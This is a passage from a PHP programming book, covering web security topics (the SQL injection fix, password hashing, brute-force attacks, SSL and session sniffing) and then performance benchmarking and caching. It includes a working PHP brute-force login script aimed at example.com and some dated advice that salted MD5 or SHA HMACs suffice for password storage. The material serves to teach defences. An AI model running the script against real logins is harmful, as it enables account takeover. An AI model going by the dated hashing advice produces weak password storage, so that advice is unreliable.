nored when thequery isexecuted, leaving theusername specification astheonly
expression inthequery’ sWHERE clause. Thequery would return asingle row,the
oneassociated with thevictim’ saccount, andtheapplication would behave as
though thevictim hadjustlogged in.Theattacker’ sgoal hasbeen accomplished:
logging inasthatuser without specifying their password.
The Fix
SQL injection vulnerabilities arealarge contributor totheFIEO mantra ofweb ap-
plication security .Thefixforthisattack issimple: useprepared statements when
executing queries containing parameters forwhich user input issubstituted. This
ensures thattheparameter values areproperly quoted toprevent user input from
being interpreted asSQL. Tosecure theoriginal code, thissegment must bechanged:PHP Master: W rite Cutting-edge Code 190
www.it-ebooks.info
$query = 'SELECT user_id FROM users WHERE username = “' . 
$_POST['username'] . '” AND password = “' . $_POST['password'] . ➥
   '”';
$statement = $pdo->query($query);
Themore secure version using prepared statements is:
chapter_05/sql_injection.php
$query = 'SELECT user_id FROM users WHERE username = ? AND ➥
  password = ?';
$statement = $pdo->prepare($query);
$statement->execute(array($_POST['username'], $_POST['password']));
Theprepare() method ofthePDO instance returns aprepared statement inthe
form ofaPDOStatement instance. That statement’ sexecute() method accepts an
array ofparameter values where theposition ofavalue within thearray corresponds
totheposition ofa?placeholder forthatvalue within thequery .PDO automatically
handles quoting parameter values thatarespecified thisway.
There isstillasecurity issue with theabove query; thiswillbecovered inthesection
called “Storing Passwords” .
Online Resour ces
Formore onSQL injection, youcanfollow upthrough these links:
■http://shiflett.org/articles/sql-injection
■http://phpsec.org/projects/guide/3.html#3.2
■urihttps://www .owasp.org/index.php/SQL_Injection
Storing P asswor ds
Incases where aweb application does properly handle user input indatabase
queries, more extensive means arerequired foranattacker toaccess auser’ saccount.
Ingeneral, thisinvolves obtaining thevictim’ scredentials inorder toaccess their
data.
One method ofaccomplishing thisisbreaking into thedatabase server used bythe
web application. Depending onwhat database server (and which version) you’re191 Security
www.it-ebooks.info
using, how theserver isconfigured, andsoon,there areanynumber ofways to
compromise it.Truth betold, thetopic islikely totake several books tocover .For
thepurposes ofthissection, however ,theattacker’ smethod ofaccessing thedatabase
ismoot; we’re assuming they’ve already succeeded. Ourgoal istominimize the
amount ofdamage they candoatthispoint.
The Attack
Having accessed thedatabase server ,onepotential action theattacker cantake is
todownload alluser account data. Ifpasswords arestored asauser would login
totheweb application, theattacker hasalltheinformation required toimpersonate
anyoftheapplication’ susers atthatpoint. Recall thelastquery example from the
previous section:
$query = 'SELECT user_id FROM users WHERE username = ? AND ➥
  password = ?';
$statement = $pdo->prepare($query);
$statement->execute(array($_POST['username'], $_POST['password']));
Even using prepared statements toprevent SQL injection attacks, thisquery isstill
insecure because itassumes thatpasswords arestored with nomodification. Ifan
attacker gains access totheusername andpassword string, they canaccess thevic-
tim’saccount.
The Fix
Inorder toprevent this, passwords must bestored inamodified form. Ideally ,this
form would make itimpossible fortheattacker toconvert thatmodified form back
into anoriginal password string.
Some online resources may suggest converting original password strings toMD5
hashes. Hashing issimply away ofencrypting adata type such asapassword string.
Iftheprevious code sample were modified tohash thepassword using anMD5
hash, itmight read asfollows:PHP Master: W rite Cutting-edge Code 192
www.it-ebooks.info
$query = 'SELECT user_id FROM users WHERE username = ? AND ➥
  password = ?';
$statement = $pdo->prepare($query);
$statement->execute(array($_POST['username'], md5($_POST ➥
  ['password'])));
Notice theaddition ofthemd5() function callonthelastline? Theproblem with
thisapproach isthatMD5 hashes arerelatively easy torecognize: they are32char-
acters long andarecomposed ofhexadecimal digits (0-9anda-f).It’spossible to
userainbow tables ,12orprecomputed tables containing possible password strings
andtheir associated hashes, tolook upanobtained password hash fortheoriginal
password onwhich thathash wasbased. Thus, thisapproach isbetter ,butstillrel-
atively insecure.
Inorder tomake itdifficult—let alone impossible—for theattacker totakeadvantage
ofavictim’ susername andpassword hash, thehashing algorithm must bemodified
sothattheapplication source code isnecessary todiscover thatmodification.
Inthiscase, themodification we’re going toapply iscalled salting .Itinvolves
adding astring (called asalt) tothepassword string before applying thehashing
algorithm toit.This prevents rainbow tables from being used toreverse thehashing
algorithm without knowing what thesaltis.Here’ sanexample ofwhat code that
uses salting might look like:
chapter_05/passwords.php
$salt = '378570bdf03b25c8efa9bfdcfb64f99e';
$hash = hash_hmac('md5', $_POST['password'], $salt);
$query = 'SELECT user_id FROM users WHERE username = ? AND ➥
  password = ?';
$statement = $pdo->prepare($query);
$statement->execute(array($_POST['username'], $hash));
Here, thefunctionhash_hmac() isused togenerate anHMAC value forthepassword.
This function uses aparticular hashing algorithm inconjunction with astring to
hash andasalttouse.Seethereturn value ofthehash_algos() function forwhich
hashing algorithms your server supports.
12http://en.wikipedia.org/wiki/Rainbow_table193 Security
www.it-ebooks.info
Withtheincreased computing capacity ofhardware available totheaverage con-
sumer ,theMD5 algorithm hasbecome lessideal forthispurpose. Depending on
their availability onyour server ,consider using theSHA-1 algorithm or,preferably ,
theSHA-256 algorithm instead.
Atthispoint, theattacker must know thatthemodified password they have isan
HMAC, what hashing algorithm wasused togenerate it,andwhat saltwasused.
Even iftheattacker gains access tothisinformation, itwould benecessary tohave
toexecute thealgorithm onrandom strings until theattacker found theonethat
results inthegiven hash, which cantake anextensive amount oftime. Inshort, it’s
become enough trouble toobtain thepassword atthispoint thattheattacker islikely
togive up.
This method will work onmost PHP installations. Additionally ,there areother
methods thatcanbeundertaken tosecure passwords.
Online Resour ces
Password storage andencryption isabroad areaofstudy; thefiner details arebeyond
thescope ofthissection. ThePHP manual hasloads ofinformation onhashing,
salting, andpassword protection techniques. Formore, check outthese sources:
■http://php.net/mcrypt
■http://www .openwall.com/phpass/
■http://codahale.com/how-to-safely-store-a-password/
■http://shiflett.org/blog/2005/feb/sha-1-broken
■http://benlog.com/articles/2008/06/19/dont-hash-secrets/
Brute For ce Attacks
Thebarrier toentry forcompromising adatabase orreversing encryption ofits
passwords may often betoohigh. Insuch cases, theattacker may resort tousing a
script thatsimulates theHTTP requests anormal user would send with aweb
browser tologintoaweb application, trying random passwords with agiven
username until thecorrect oneisfound. This isknown asabrute force attack .PHP Master: W rite Cutting-edge Code 194
www.it-ebooks.info
The Attack
Anattacker may useageneral purpose script orwrite onespecific toasitethey
want tocompromise. Ineither case, such ascript will usually execute anHTTP re-
quest representing anattempt tologintotheweb application; itwill then check
theresponse foranindication thatthelogin request succeeded ornot.When alogin
attempt fails, web applications usually redisplay thelogin form with amessage in-
dicating thatresult. Here’ sanexample ofthemarkup thatafailed login might gen-
erate:
<p class=”error”>Invalid username or password.</p>
<form method=”post” action=”http://example.com/login.php”>
  <p>Username: <input type=”text” name=”username” /></p>
  <p>Password: <input type=”password” name=”password” /></p>
  <p><input type=”submit” value=”Log In” /></p>
</form>
Ascript toexecute abrute force attack against thisform might resemble thefollow-
ing:
chapter_05/brute_for ce.php
$url = 'http://example.com/login.php';
$post_data = array('username' => 'victims_username');
$length = 0;
$password = array();
$chr = array_combine(range(32, 126), array_map('chr', ➥
  range(32, 126)));
$ord = array_flip($chr);
$first = reset($chr);
$last = end($chr);
while (true) {
  $length++;
  $end = $length-1;
  $password = array_fill(0, $length, $first);
  $stop = array_fill(0, $length, $last);
  while ($password != $stop) {
    foreach ($chr as $string) {
      $password[$end] = $string;
      $post_data['password'] = implode('', $password);
      $context = stream_context_create(array('http' => array(
        'method' => 'POST',
        'follow_location' => false,195 Security
www.it-ebooks.info
        'header' => 'Content-Type: application/ ➥
          x-www-form-urlencoded',
        'content' => http_build_query($post_data)
      )));
      $response = file_get_contents($url, false, $context);
      if (strpos($response, 'Invalid username or password.') ➥
            === false) {
        echo 'Password found: ' . $post_data['password'], PHP_EOL;
        exit;
      }
    }   
    for ($left = $end-1; isset($password[$left]) && $password ➥
      [$left] == $last; $left--);
    if (isset($password[$left]) && $password[$left] != $last) {
      $password[$left] = $chr[$ord[$password[$left]]+1]; 
      for ($index = $left+1; $index <= $length; $index++) {
        $password[$index] = $first;
      }
    }   
  }
}
This script sequentially generates passwords comprising allcommonly used printable
characters thatcanbeentered using akeyboard. Itbegins with passwords oflength
1,butcanbemodified tobegin with alonger length bysimply modifying theinitial
value ofthe$length variable. Once itgenerates allpossible passwords ofagiven
length, itincrements thelength andbegins thepassword generation process again
using thenew length.
Using PHP streams, thescript executes POST requests against theURL used bythe
form andincludes theusername andgenerated password intheform data itsubmits.
Thescript then checks theresponse body forthesubstring indicating afailed login
attempt. Ifitdoesn’t find thestring, itassumes thepassword iscorrect, outputs it,
andterminates. More extensive error checking islikely needed intheHTTP request
logic, butthecode shown issufficient forthepurposes ofthisexample.
The Fix
Software likeFail2ban13canintegrate with firewalls toblock users byIP,based on
excessive failed login attempts indicating brute force attacks. However ,youmay
13http://www .fail2ban.orgPHP Master: W rite Cutting-edge Code 196
www.it-ebooks.info
sometimes lack sufficient control over your server environment toinstall such
software. Insuch cases, prevention ofthisattack must beimplemented attheapplic-
ation level.
Specific implementations ofthiscanvary,butmost ofthem boildown totemporarily
suspending theuser’ sability tologinwith aspecific account. Insome cases, this
istime-based, such aspreventing login attempts forfiveminutes once auser has
failed tosubmit accurate credentials foranaccount three times. This limits theef-
fectiveness ofbrute force attacks, both byincreasing their necessary complexity and
bysubstantially extending theamount oftime ittakes toexecute them.
Such implementations may also take into account theuser’ sIPaddress andonly
prevent login attempts from thatIPaddress. Ingeneral, attackers will beusing a
completely different IPaddress from thevictim they’re trying tocompromise. Ac-
counting fortheIPaddress inthisway prevents thismeasure against brute force
attacks from having aneffect onlegitimate account owners.
Another common tactic istoemploy aCAPTCHA (Completely Automated Public
Turing testtotellComputers andHumans Apart), which presents theuser with
some form ofsmall task todetermine ifthey arehuman ormachine after acertain
number offailed login attempts. Theexact nature ofthistaskvaries. Most CAPTCHA
implementations present theuser with animage containing distorted text, andasks
them toenter thecharacters from thattextinto atextbox. One interesting service
isreCAPTCHA ,which employs theuser input inaproject todigitize books, and
includes analternative audio version forvisually disabled users. Apopular altern-
ative totheimage approach isasking theuser toanswer asimple arithmetic problem,
such as“What is2+2?”.While CAPTCHAs canbecircumvented insome cases,
they canalso make brute force attacks significantly more difficult toachieve.
Online Resour ces
Once again, theOpen WebApplication Security Project isthefirst place tohead
forfurther reading onbrute force attacks, andWikipedia’ spage onthetopic isalso
highly informative:
■https://www .owasp.org/index.php/Brute_force_attack
■http://en.wikipedia.org/wiki/Brute-force_attack197 Security
www.it-ebooks.info
SSL
There isamethod ofcapturing session identifiers andeven user credentials that
wedidn’t cover intheprevious section onsession hijacking. Let’sconsider acommon
scenario where multiple people areusing anopen wireless network atacafé. In
such asituation where youdon’t control who hasaccess tothenetwork youuse,
it’spossible forothers toemploy programs called packet sniffers tointercept the
data your computer sends over thenetwork. This includes HTTP requests. The
implications ofthiswill become obvious shortly (ifthey’re yettobealready!).
The Attack
Thevictim connects tothecafé’swireless network, opens their web browser ,and
proceeds topull upthelanding page ofaweb application containing alogin form.
They enter their username andpassword, andsubmit theform. Atthispoint, an
HTTP request resembling thisoneissent over thenetwork:
POST /login.php HTTP/1.1
Host: example.com
username=victims_username&password=victims_password
Any attacker who isonthesame network andhasaccess toapacket sniffer—such
astheFiresheep extension fortheFirefox web browser—can intercept thisrequest,
obtain thevictim’ scredentials, andusethem toimpersonate thevictim within that
web application.
Let’ssaythatbythetime theattacker hasconnected tothenetwork andstarted in-
tercepting network traffic, thevictim hassince logged intotheweb application.
That is,theattacker hasmissed thewindow ofopportunity tointercept thevictim’ s
credentials. This doesn’t stop them from impersonating theuser.Let’sexamine a
request thatthevictim might send once they’ve logged in:
GET /somepage.php HTTP/1.1
Host: example.com
Cookie: PHPSESSID=82551688a6333d57647b3ae8807de118
Ifthecookie data looks familiar ,itshould: thisisacookie setbyPHP topersist the
user’ ssession identifier .Recall thatobtaining avalid session identifier ,regardlessPHP Master: W rite Cutting-edge Code 198
www.it-ebooks.info
ofhow it’sdone, isthegoal ofboth session fixation andsession hijacking attacks.
Atthispoint, theattacker hasaccomplished exactly that.
Any number ofextensions formodern web browsers, such astheWebDeveloper
toolbar forFirefox, allows auser tomanually addcustom cookies foraparticular
website. This makes iteasy foranattacker tohave their web browser useavictim’ s
session identifier .Unless theweb application haschecks inplace tocombat session
hijacking, theattacker canaccess theweb application from their browser asthough
they were thevictim.
The Fix
Session hijacking prevention measures may help here, butthey’re insufficient to
solve theproblem. Theunderlying issue isthattraffic sent over thenetwork isun-
modified, andcompletely open foranyone with apacket sniffer tointercept.
Thesolution istoencrypt communications between theuser andthewebapplication
using SSL, orSecure Socket Layer ,aprotocol fortransmitting private documents
viatheInternet. Most modern web browsers support useofSSL. There aretwosteps
toimplementing itsusage ontheweb application side:
1.Obtain anSSL certificate from atrusted certificate authority ,andconfigure web
servers hosting thatapplication anditsassets tousethatcertificate.
2.Implement anyconfiguration orsource code changes necessary such thattheweb
application forces clients accessing ittouseHTTPS (which isHTTP encrypted
using SSL).
Theexact details ofthefirst step will vary based ontheoperating system andweb
server being used; consult thedocumentation forwhat you’re using formore inform-
ation onthis. Thesecond step cansometimes beaccomplished byweb server -level
configuration aswell, such aswith themod_rewrite module fortheApache web
server .This ispreferable because itcancover requests other than those forPHP
scripts. However ,insome cases, youmay want toenforce thisattheapplication
level. This check issufficient formost server environments:199 Security
www.it-ebooks.info
chapter_05/ssl.php
$using_ssl = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == ➥
  'on' || $_SERVER['SERVER_PORT'] == 443;
if (!$using_ssl) {
  header('HTTP/1.1 301 Moved Permanently');
  header('Location: https://'.$_SERVER['SERVER_NAME'].$_SERVER ➥
    ['REQUEST_URI']);
  exit;
}
Recall thatonce acookie issetforadomain, thatcookie ispersisted bythebrowser
inallsubsequent requests tothatdomain. This includes requests forstatic assets
such asimages, orCSS andJavaScript files. Thus, inorder toprevent session
identifiers from being exposed, allrequests made after onethatsetsasession
cookie must useSSL.
There wasapoint intime when theuseofSSL onFacebook waslimited tothere-
quest tologintothesite. Since therelease ofFiresheep, however ,Facebook has
moved allrequests tobebehind SSLtoprevent thistype ofsession identifier leakage.
Online Resour ces
Ifyou’re interested inreading more about SSL, take alook atthese websites:
■http://arst.ch/bgm
■https://www .owasp.org/index.php/SSL_Best_Practices
Resour ces
This chapter isonly meant toprovide fundamental concepts needed toimplement
security measures inyour PHP applications. Youreducation inthissubject should
notendhere! Thelistofresources below provides agood starting point forsupple-
menting thematerial covered bythischapter:
http://www .php.net/manu-
al/en/security .phpThePHP manual hasitsown section onvarious
security concerns, some general andsome specific
toenvironmental configuration. It’sagreat starting
point forassessing your server setup andcode.PHP Master: W rite Cutting-edge Code 200
www.it-ebooks.info
http://www .phparch.com
/books/phparchitects-guide-to-
php-security/14This book byIliaAlshanetsky isagood stepping-
offpoint forthischapter .Itcovers afewofthe
same topics andthen some, anddoes soinmore
depth.
http://phpsecurity .org/15This istheaccompanying website forthebook
Essential PHP Security ,written byrenowned se-
curity expert Chris Shiflett. Itprovides acompre-
hensive reference forPHP application security
topics.
http://www .inform-
it.com/store/product.as-
px?isbn=0672324547TheHTTP Developer’ sHandbook isanother title
byChris Shiflett ontheHTTP protocol, andin-
cludes several chapters related toSSLandsecurity
asitapplies toHTTP .
http://www .phparch.com
/magazine16This monthly professional publication covers a
variety ofPHP-related topics. Among itsfeatures
istheSecurity Corner column, which covers se-
curity topics ofrecent interest.
http://phpsec.org/projects/guide/ One oftheprojects ofthePHP Security Consorti-
umisthePHP Security Guide, adocument that
describes common security vulnerabilities and
PHP-specific approaches foravoiding them.
https://www .owasp.org/in-
dex.php/Cat-
egory:OW ASP_Guide_ProjectTheOpen WebApplication Security Project
maintains several sub-projects, oneofwhich is
theDevelopment Guide. This document provides
practical guidance inapplication-level security
issues andincludes code samples forseveral lan-
guages including PHP.
14http://www .phparch.com/books/phparchitects-guide-to-php-security/
15http://phpsecurity .org
16http://www .phparch.com/magazine201 Security
www.it-ebooks.info
http://www .enigmagroup.org/17This siteoffers information andpractical exercises
related tomany potential attack vectors forweb
applications aswell asdiscussion forums. Note
thatregistering auser account isrequired toaccess
much ofitscontent.
https://www .pcisecuritystand-
ards.org/18ThePCISecurity Standards Council maintains
thedefacto standard forsecurity insystems that
facilitate online payments, such asecommerce
applications.
17http://www .enigmagroup.org
18https://www .pcisecuritystandards.orgPHP Master: W rite Cutting-edge Code 202
www.it-ebooks.info
Chapter6
Performance
Soyou’re writing thenext bigthing, oratleast trying to.IsitGoogle+ orFacebook?
You’ve gotalimited budget, andyouhave tobeready for100to100,000,000 hits
tomorrow!
Youdidyour bestduring development towrite efficient code, anditallseems fairly
speedy .One-second load times? That’ sgood enough, right? Except now youhave
actual users, notjustyour small devteam hitting your server ,andthings arestarting
tofallover …oh,no!
Benchmarking
There aretwoways toknow ifyour code needs performance help: bybenchmarking
during development, orwhen your servers start totopple from theload. Benchmark-
ing,asitrelates toweb applications, typically means “stress testing”—throwing as
much simulated traffic atyour code aspossible tomeasure how well itperforms.
Unfortunately ,benchmarking ismore ofabest-guess scenario, andeven with all
thepreproduction performance tweaks intheworld, sometimes it’sjustnotenough.
Fortunately ,thisiswhere profiling comes in,andwe’ll address thatattheendof
thischapter .
www.it-ebooks.info
There aretwotools thatwerecommend forbenchmarking: ApacheBench (ab)and
JMeter .1Tostress testweneed twothings: simultaneous users andnumerous re-
quests. Inboth these tools, theusers arerepresented bythenumber ofsimultaneous
application threads. Sojustremember: concurrent threads =concurrent users.
ApacheBench issuper simple andtypically included with your Apache install, or
aspartoftheApache development package—the binary iscalled simplyab.Touse
ab,justspecify thetotal number ofrequests (-n),andthenumber ofsimultaneous
threads (-c),andletitgotowork. Forexample, here weareusing –n 1000 –c 20
tocreate 20simultaneous threads toperform 1,000 requests:
$ ab -n 1000 -c 20 http://example.org/
This is ApacheBench, Version 2.3 <$Revision: 655654 $>
Copyright 1996 Adam Twiss, Zeus Technology Ltd, http:// ➥
  www.zeustech.net/
Licensed to The Apache Software Foundation, http://www.apache.org/
Benchmarking example.org (be patient)
Completed 100 requests
Completed 200 requests
Completed 300 requests
Completed 400 requests
Completed 500 requests
Completed 600 requests
Completed 700 requests
Completed 800 requests
Completed 900 requests
Completed 1000 requests
Finished 1000 requests
Server Software:        Apache/2.2.17
Server Hostname:        example.org
Server Port:            80
Document Path:          /
Document Length:        7452 bytes
Concurrency Level:      20
Time taken for tests:   12.023 seconds
Complete requests:      1000
1http://jakarta.apache.org/jmeter/PHP Master: W rite Cutting-edge Code 204
www.it-ebooks.info
Failed requests:        0
Write errors:           0
Total transferred:      7904000 bytes
HTML transferred:       7452000 bytes
Requests per second:    83.18 [#/sec] (mean)
Time per request:       240.450 [ms] (mean)
Time per request:       12.023 [ms] (mean, across all concurrent ➥
  requests)
Transfer rate:          642.02 [Kbytes/sec] received
Connection Times (ms)
              min  mean[+/-sd] median   max
Connect:        1    6   4.8      4      30
Processing:    62  233  49.6    229     708
Waiting:       62  231  50.1    227     705
Total:         63  239  49.5    235     714
Percentage of the requests served within a certain time (ms)
  50%    235
  66%    250
  75%    263
  80%    271
  90%    299
  95%    327
  98%    366
  99%    386
 100%    714 (longest request)
Remember the T railing Slash
Asit’stherequest path,abwill only perform thetestifithasatrailing slash.
This performs 1,000 requests asquickly aspossible using 20concurrent connections.
Toputthatinperspective, iftheserver canservice 20requests persecond, every
second ofevery dayofanygiven month, that’s50million requests permonth. We
managed 83requests persecond—that’ s215million requests permonth .
Looking atallthisoutput, theparts weshould beinterested inseeing are:
■time taken fortests
■complete requests
■failed requests205 Performance
www.it-ebooks.info
■requests persecond
■connection times
TheConnection Times section isvery interesting, asitcomprises four different
numbers:
Connection: how long ittakes theweb server toopen aconnection
Processing: how long therequest takes, from thetime ofconnection totheend
oftherequest
Waiting: how long ittakes Apache toprocess therequest andsend thefull
response
Total: how long therequest takes from start tofinish
ApacheBench barely supports testing ofmuch more than basicGETrequests, but
forthistype oftesting, it’sjusttooeasy andquick toignore.
JMeter isanother Apache project with aGUI, andmore capability .WithJMeter ,you
create atestplan, addthread groups (forexample, Xnumber ofthreads performing
Nnumber ofrequests each), addsamplers (such asperforming anHTTP request),
specify their configuration, addother options likeacookie handler ,andadd
listeners tohandle theresults. Figure 6.1shows anexample ofaJMeter setup.
Figur e 6.1. JMeter comes with a handy GUIPHP Master: W rite Cutting-edge Code 206
www.it-ebooks.info
This testplan consists ofonethread group. We’regoing tobedoing twounique
HTTP requests inthisthread group, sowewant 10threads each (total of20),with
50requests perthread (giving us1,000 requests), asshown inFigure 6.2.
Figur e 6.2. Cr eating our thr ead gr oup
Within thisthread group, wehave aCookie Manager ,depicted inFigure 6.3;this
ensures thatsessions areinitialized.207 Performance
www.it-ebooks.info
Figur e 6.3. The JMeter Cookie Manager
Next, wehave ourtwoHTTP requests: oneforthehome page andoneforourlogin
screen, thelatter shown inFigure 6.4.Inthiscase, both areGETrequests. Wecould
also setupthesystem tonotclear cookies between requests, andhave aPOST for
login, andthen aGETonasecure page.
Figur e 6.4. The HTTP Request for our login scr eenPHP Master: W rite Cutting-edge Code 208
www.it-ebooks.info
Finally ,wehave three result listeners. Thefirst isshown inFigure 6.5andwill let
usinspect therequests themselves, intheir entirety .
Figur e 6.5. The JMeter View Results T ree shows us all r equests
Thesecond isasimple summary table, shown inFigure 6.6.
Figur e 6.6. The JMeter Summary Report gives us an alternate view of r esults
Meanwhile thelast, inFigure 6.7,shows theresults inagraph.209 Performance
www.it-ebooks.info
Figur e 6.7. JMeter also offer s a gr aphical interpr etation of r esults
Ingeneral, benchmarks arelikeIQtests; thatis,anIQtestonly tests how well you
perform inIQtests. Benchmarks arenever true indicators ofperformance, other
than how well code performs inbenchmarks. Benchmarks become useful when
comparing against other benchmarks; thisallows youtohave relative metrics on
performance enhancements.
One point toremember ,andacommon flaw people make, isthatthebenchmarking
toolrequires resources, too;ifyoubenchmark from thesame machine serving the
website, you’ll always record false numbers. Theresults arestilluseful forthose
relative metrics, butotherwise, they’re even more useless than benchmarks usually
are.
System T weaks
Ofcourse, your code isn’t toblame, right? PHP isfairly fast, andyouwrote good
code—it hastobesomething else. Let’sstart bylooking athow wecanoptimize
ourserver configuration.
Code Caching
Thefirst item we’re going tocover isopcode caches. You’ve probably heard since
your earliest days asaPHP developer thatPHP isascripting language, aninterpretedPHP Master: W rite Cutting-edge Code 210
www.it-ebooks.info
language, thatnocompiling isrequired …well, thisisn’t exactly true. Stick with
ushere.
PHP isn’t compiled inthetraditional sense, whereby youcompile thecode with a
compiler likeGCC (theGNU CCompiler), anddeploy theresulting binary .However ,
oneach request, thePHP code isparsed, compiled toopcodes (ortokens), andthose
tokens arethen passed totheZend Engine tobeexecuted.
ThePHP request lifecycle islikeanon-the-fly rendition oftheJava lifecycle. When
Java iscompiled, itisparsed andcompiled into aninstruction setcalled bytecode;
onexecution, thatbytecode isexecuted bytheJVM (Java Virtual Machine). The
Zend Engine isalso considered avirtual machine.
Figure 6.8shows thePHP andJava lifecycles; notice how theonly difference is
thatthePHP opcodes arenotsaved asabinary filebefore execution.
Figur e 6.8. The life cycle of a PHP script compar ed to a Java file
Itturns outthatinthisregard atleast, Java wasright: theparse/compile phase is
slow .Who knew ,right? Butwecanfixthis, byusing anopcode cache .Anopcode
cache will store theopcodes after thefirst time, feeding them totheZend Engine
upon subsequent requests. Figure 6.9illustrates thisnew lifecycle.211 Performance
www.it-ebooks.info
Figur e 6.9.  The life cycle of a PHP script using an opcode cache
Inourexperience, adding anopcode cache isthesingle most beneficial (and frankly ,
easiest) thing youcandotospeed upyour code. Sometimes, anopcode cache isall
youneed.
So,how doyouinstall thismagic? It’ssimple:
$ pecl install apc
This will grab APC from PECL—the PHP Extension Community Library—compile,
andinstall theextension. After this, depending onyour setup, youmay then have
toedityour php.ini andadd:
extension=apc.so
Restart PHP (that is,Apache), andyou’re good togo.
Let’snow take alook atsome benchmarks. This isagainst aZend Framework-based
application running onaMacBook Pro(Quad Core i52.4GHz). First, without APC:PHP Master: W rite Cutting-edge Code 212
www.it-ebooks.info
Concurrency Level:      20
Time taken for tests:   22.721 seconds
Complete requests:      1000
Failed requests:        0
Write errors:           0
Total transferred:      5698000 bytes
HTML transferred:       5434000 bytes
Requests per second:    44.01 [#/sec] (mean)
Time per request:       454.418 [ms] (mean)
Time per request:       22.721 [ms] (mean, across all concurrent ➥
  requests)
Transfer rate:          244.90 [Kbytes/sec] received
Connection Times (ms)
              min  mean[+/-sd] median   max
Connect:        0    5  14.7      1     160
Processing:   245  447  54.6    450     630
Waiting:      241  445  54.7    447     606
Total:        248  452  53.8    454     707
Percentage of the requests served within a certain time (ms)
  50%    454
  66%    475
  75%    489
  80%    495
  90%    518
  95%    533
  98%    553
  99%    571
 100%    707 (longest request)
Thelinewearemost interested inistheRequests per second ,which forthispage
is44requests persecond. Now let’senable APC, justbyaddingextension=apc.so
toourconfiguration (that is,using allthedefaults), andseewhat happens:
Concurrency Level:      20
Time taken for tests:   11.049 seconds
Complete requests:      1000
Failed requests:        0
Write errors:           0
Non-2xx responses:      1000
Total transferred:      5698000 bytes
HTML transferred:       5434000 bytes
Requests per second:    90.51 [#/sec] (mean)213 Performance
www.it-ebooks.info
Time per request:       220.981 [ms] (mean)
Time per request:       11.049 [ms] (mean, across all concurrent ➥
  requests)
Transfer rate:          503.61 [Kbytes/sec] received
Connection Times (ms)
              min  mean[+/-sd] median   max
Connect:        0    6  17.4      2     196
Processing:    95  213  33.6    214     319
Waiting:       85  211  33.6    212     315
Total:        105  219  37.2    219     431
Percentage of the requests served within a certain time (ms)
  50%    219
  66%    231
  75%    239
  80%    245
  90%    261
  95%    277
  98%    305
  99%    361
 100%    431 (longest request)
This time, weareachieving 90requests persecond. We’ve justeffectively doubled
theusefulness ofourhardware. You’ll notice thateven thelongest request wasfaster
than thefastest request without APC.
Wecantweak thiseven further byaddingapc.stat = 0 toourphp.ini ;thiswill
disable automatic updating ofthecache when files aremodified. This means you’ll
have torestart your web server orclear thecache when youmake changes; butfor
production servers thatrarely seechanges, thiscanbebeneficial:
Concurrency Level:      20
Time taken for tests:   9.710 seconds
Complete requests:      1000
Failed requests:        0
Write errors:           0
Non-2xx responses:      1000
Total transferred:      5678000 bytes
HTML transferred:       5414000 bytes
Requests per second:    102.99 [#/sec] (mean)
Time per request:       194.202 [ms] (mean)
Time per request:       9.710 [ms] (mean, across all concurrent ➥PHP Master: W rite Cutting-edge Code 214
www.it-ebooks.info
  requests)
Transfer rate:          571.05 [Kbytes/sec] received
Connection Times (ms)
              min  mean[+/-sd] median   max
Connect:        0    6  11.6      2     129
Processing:    81  187  33.3    188     283
Waiting:       81  185  33.3    186     272
Total:         82  193  34.6    193     332
Percentage of the requests served within a certain time (ms)
  50%    193
  66%    206
  75%    215
  80%    220
  90%    236
  95%    247
  98%    260
  99%    278
 100%    332 (longest request)
Asyoucansee,wearenow upto103requests persecond. Nottooshabby ,eh?
Butwhat about Windows/IIS? Well,thanks toMicrosoft there isagreat Windows
opcode cache called WinCache. Simply obtain theextension from theWinCache
website,2andplace inyour extensions directory .
Once you’ve done that, addthefollowing toyour php.ini andrestart IIS:
extension=php_wincache.dll
It’saseasy asthat.
INI Settings
Another setting thatyoucantweak foroptimization istouseadifferent storage
mechanism forsession data; inthiscase memcached .Memcached isamemory-
based, cluster -friendly key-value store. Ifyouenable thememcache extension
(ext/memcache ),you’ll beable toautomatically usememcached forsession storage
instead ofthedisk:
2http://www .iis.net/download/wincacheforphp215 Performance
www.it-ebooks.info
$ pecl install memcache # Install ext/memcache
$ memcached –d –m 128 # Start memcached
Once youhaveext/memcache installed, yousimply setyour php.ini likeso:
session.save_handler = "memcache"
session.save_path = "tcp://localhost:11211"
Now let’stake alook atourperformance before andafter,inTable 6.1.
Table 6.1. P erformance Figur es with and without Memcached
Requests per
SecondMaximum
Response TimeMinimum
Response TimeAverage
Response TimeStorage T ype
23 7106 98 836 File-based
24 1848 103 798 MySQL-based
25 1473 86 771 Memcached-based
So,we’re notseeing ahuge difference inresponse time here: 23(file) vs24(MySQL)
vs25(memcached) requests persecond. However ,it’snotalways about rawspeed.
Memcached isanetworked daemon thatcaneasily bespread across multiple servers.
Inthiscase, multiple web servers canuseitasacentral store fortheir sessions. This
makes load balancing much easier; allsessions caneasily beaccessed from allweb
servers inacluster ,without theoverhead ofacentral RDBMS (relational database
management system).
Asthenumber ofsessions grows, memcached will scale farbetter .
Databases
Most websites these days have adatabase storing their data. When testing theper-
formance ofyour website, itvery quickly becomes apparent thatforalarge part of
thetime, your application isworking ondatabase interaction. While anumber of
sites aremoving toso-called NoSQL (seethesection called “Choosing How toStore
Data” inChapter 2)tosolve their performance problems, nodocument-based database
cantruly liveuptoarelational database when youneed relational data.PHP Master: W rite Cutting-edge Code 216
www.it-ebooks.info
There areserver configurations thatcandramatically improve your database per-
formance, butthebestsolution toperformance issues istofocus onoptimizing your
queries.
Themethod foroptimizing your queries isgoing tovary based ontheRDBMS (rela-
tional database management system) youuse. Sometimes, however ,nomatter how
much youoptimize aquery ,itjustisn’t fastenough. This iswhen youneed tostart
thinking about caching. Typically ,amemory-based cache likememcached (which
wasbuilt forcaching ofdatabase queries) will beutilized forthistask. Caching is
covered inthesection called “Caching” .
File System
Disks aredisks aredisks. They canalsocause massive bottleneck problems thatare
difficult tosolve ifyouneed tostore data ondisk. While youcanthrow infaster
disks (15,000 RPM SCSI drives anybody?), better RAID strategies (“striping”), and
SSDs, there isstillalimit you’re going tohitsooner orlater.
Thebest strategy forthisistoutilize memory-based caches fordisk data where
possible. Whether it’stheconfiguration fileyouhave toread onevery request, or
thePHP files used torunthesite, there aremany options forthis, andthey allmean
onething: caching.
Caching
What’ sbetter than making your code runfaster? Making itsoitdoesn’t have torun
atall.They sayinsanity isdoing thesame task over andover again andexpecting
adifferent result; well, wedothisallthetime inourcode. Areweallinsane? We’d
sure hope not!
Wecanstop thisinsanity bycaching each unique execution ofagiven piece ofcode.
